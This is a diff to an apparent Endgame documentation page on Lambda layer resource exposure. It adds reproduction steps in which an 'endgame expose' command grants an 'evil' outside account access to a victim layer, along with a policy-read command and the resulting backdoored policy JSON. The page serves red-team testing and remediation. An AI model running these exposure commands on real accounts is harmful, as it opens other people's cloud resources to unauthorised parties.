@@ -2,9 +2,42 @@
 
 ## Steps to Reproduce
 
+* To expose the resource using `endgame`, run the following from the victim account:
+
+```bash
+export EVIL_PRINCIPAL=arn:aws:iam::999988887777:user/evil
+
+endgame expose --service lambda-layer --name test-resource-exposure:1
+```
+
+* To view the contents of the Lambda layer policy, run the following:
+
+```bash
+export VICTIM_RESOURCE_ARN=arn:aws:lambda:us-east-1:111122223333:layer:test-resource-exposure
+export VERSION=3
+aws lambda get-layer-version-policy \
+    --layer-name $VICTIM_RESOURCE_ARN \
+    --version-number $VERSION
+```
+
+* Observe that the output of the overly permissive Lambda Layer Policy resembles the example shown below.
+
 ## Example
 
+Observe that the Evil principal's account ID (`999988887777`) is given `lambda:GetLayerVersion` access to the Lambda layer `arn:aws:lambda:us-east-1:111122223333:layer:test-resource-exposure:1`.
+
+```json
+{
+    "Policy": "{\"Version\":\"2012-10-17\",\"Id\":\"default\",\"Statement\":[{\"Sid\":\"AllowCurrentAccount\",\"Effect\":\"Allow\",\"Principal\":{\"AWS\":\"arn:aws:iam::111122223333:root\"},\"Action\":\"lambda:GetLayerVersion\",\"Resource\":\"arn:aws:lambda:us-east-1:111122223333:layer:test-resource-exposure:1\"},{\"Sid\":\"Endgame\",\"Effect\":\"Allow\",\"Principal\":{\"AWS\":\"arn:aws:iam::999988887777:root\"},\"Action\":\"lambda:GetLayerVersion\",\"Resource\":\"arn:aws:lambda:us-east-1:111122223333:layer:test-resource-exposure:1\"}]}",
+    "RevisionId": ""
+}
+```
+
 ## Exploitation
+
+```
+TODO
+```
 
 ## Remediation
 
@@ -24,4 +57,5 @@ Also, consider using [Cloudsplaining](https://github.com/salesforce/cloudsplaini
 ## References
 
 * [aws lambda add-layer-version-permission](https://awscli.amazonaws.com/v2/documentation/api/latest/reference/lambda/add-layer-version-permission.html)
+* [aws lambda get-layer-version-policy](https://awscli.amazonaws.com/v2/documentation/api/latest/reference/lambda/get-layer-version-policy.html)
 * [Access Analyzer support for AWS Lambda Functions](https://docs.aws.amazon.com/IAM/latest/UserGuide/access-analyzer-resources.html#access-analyzer-lambda)
